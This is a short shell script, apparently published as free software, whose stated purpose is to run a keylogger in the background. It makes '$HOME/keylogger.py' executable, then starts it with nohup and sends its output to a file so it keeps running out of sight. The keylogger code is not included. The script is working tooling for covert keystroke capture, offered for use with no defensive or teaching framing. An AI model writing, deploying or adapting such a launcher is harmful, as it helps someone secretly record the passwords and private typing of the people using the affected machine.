##This shell script is a free software
##Developed by Joshia Rheinier
##The purpose of this script is to run the keylogger on background


#Put your keylogger script along with its full directory here
FILE="$HOME/keylogger.py"

#Make the program be able to be executed
chmod +x $FILE
#Execute the program with Python 3, and
#put the process in background with 
#nohup command
nohup python3 $FILE &> no-output&
